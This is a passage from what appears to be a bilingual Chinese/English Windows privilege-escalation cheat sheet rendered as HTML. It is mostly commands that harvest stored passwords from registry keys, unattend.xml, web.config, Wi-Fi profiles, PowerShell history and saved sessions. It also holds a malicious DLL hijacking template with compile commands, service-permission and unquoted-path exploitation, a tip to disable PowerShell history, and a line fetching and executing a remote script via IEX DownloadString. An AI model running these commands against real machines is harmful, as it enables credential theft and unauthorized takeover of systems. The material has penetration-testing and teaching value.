</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="在-unattendxml-中搜索密码">在 unattend.xml 中搜索密码</h3>
<p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installs提权 - zpchcbd - 博客园</a></li>
</ul>

<h3 id="iis-web-config-中的密码">IIS Web config 中的密码</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="其他可能存在凭证的文件">其他可能存在凭证的文件</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-密码">Wifi 密码</h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。</p>

<h3 id="便笺中存放的密码">便笺中存放的密码</h3>
<p>The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="服务中存放的密码">服务中存放的密码</h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-中存放的密码">Key Manager 中存放的密码</h3>
<p>This software will display its output in a GUI</p>

<p>下面的命令将打开 windows 凭据管理器。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-历史记录中存放的密码">Powershell 历史记录中存放的密码</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>关闭 ps 历史记录</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-文件">Powershell Transcript 文件</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="备用数据流ads中的密码">备用数据流（ADS）中的密码</h3>
<p>ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。</p>

<p>例如在 notepad 中编辑但未保存到文件的数据。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h2 id="进程相关提权方式">进程相关提权方式</h2>
<h3 id="哪些进程在运行">哪些进程在运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="哪些进程以-system-权限运行">哪些进程以 system 权限运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。</p>

<h3 id="powershell-版本">Powershell 版本</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="枚举已安装程序">枚举已安装程序</h3>
<p>已安装程序可作为提权突破点。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="枚举已安装服务">枚举已安装服务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="枚举计划任务">枚举计划任务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="枚举自启动应用">枚举自启动应用</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>

<h2 id="利用服务权限错误提权">利用服务权限错误提权</h2>
<p>以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。</p>
<h3 id="dll-劫持">DLL 劫持</h3>
<ol>
  <li>寻找 DLL 劫持利用点
    <ol>
      <li>PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for “Name Not Found”</li>
    </ol>
  </li>
  <li>编译恶意 DLL
    <ol>
      <li>For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
      <li>For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
    </ol>

    <p>windows_dll.c 内容</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>寻找权限配置不当的 PATH 目录
    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。</p>

<p>参考：</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园</a></li>
</ul>

<h3 id="path-路径可写">PATH 路径可写</h3>
<p>下面的命令可以对服务的 path 路进具备的权限进行排查。</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>两组命令都可以用，但会生成文件。</p>

<p>或者也可以直接使用 msf 中的 exp：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>

<h2 id="利用-linux-子系统提权">利用 Linux 子系统提权</h2>
<blockquote>
  <p>凭借 root 权限，Windows Subsystem for Linux (WSL) 允许用户在任何端口上创建绑定 shell（无需提升）。  不知道 root 密码？  没问题，只需将默认用户设置为 root W/.exe –default-user root 即可。  现在启动您的绑定 shell 或反向操作。</p>
</blockquote>

<p>Windows 子系统的文件目录也是可以直接查看的：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\%</span>USERNAME%<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\C</span>anonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc<span class="se">\L</span>ocalState<span class="se">\r</span>ootfs<span class="se">\</span>
</code></pre></div></div>

<h2 id="利用未加引号的服务路径提权">利用未加引号的服务路径提权</h2>
<p>利用条件：</p>
<ul>
  <li>服务的路径存在无引号且包含空格或其他分隔符。</li>
  <li>上级路径可写。</li>
</ul>

<blockquote>
  <p>Microsoft Windows 无引号服务路径枚举漏洞。<br />
所有 Windows 服务都有其可执行文件的路径。<br />
如果该路径未加引号且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。</p>
</blockquote>

<p>例如：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For C:<span class="se">\P</span>rogram Files<span class="se">\s</span>omething<span class="se">\l</span>egit.exe, Windows will try the following paths first:

    C:<span class="se">\P</span>rogram.exe
    C:<span class="se">\P</span>rogram Files.exe
</code></pre></div></div>
<p>如果这类路径可写，即可劫持该服务的 exe，如果该服务具备高权限，则可提权。</p>

<p>搜索此类服务。</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">get</span> <span class="kd">name</span><span class="o">,</span><span class="kd">displayname</span><span class="o">,</span><span class="kd">pathname</span><span class="o">,</span><span class="kd">startmode</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"Auto"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"C:\Windows\\"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"""

wmic service get name,displayname,startmode,pathname | findstr /i /v "</span><span class="kd">C</span>:\Windows\\<span class="s2">" |findstr /i /v """</span>

<span class="kd">gwmi</span> <span class="na">-class </span><span class="kd">Win32_Service</span> <span class="na">-Property </span><span class="kd">Name</span><span class="o">,</span> <span class="kd">DisplayName</span><span class="o">,</span> <span class="kd">PathName</span><span class="o">,</span> <span class="kd">StartMode</span> <span class="o">|</span> <span class="kd">Where</span> <span class="o">{</span>$_.StartMode <span class="na">-eq </span><span class="s2">"Auto"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s2">"C:\Windows*"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s1">'"*'</span><span class="o">}</span> <span class="o">|</span> <span class="kd">select</span> <span class="kd">PathName</span><span class="o">,</span><span class="kd">DisplayName</span><span class="o">,</span><span class="kd">Name</span>
</code></pre></div></div>

<p>漏洞利用：</p>
<ul>
  <li>Metasploit exploit : exploit/windows/local/trusted_service_path</li>
  <li>PowerUp exploit
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="c"># find the vulnerable application</span><span class="w">
  </span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"</span><span class="w">

  </span><span class="o">...</span><span class="w">
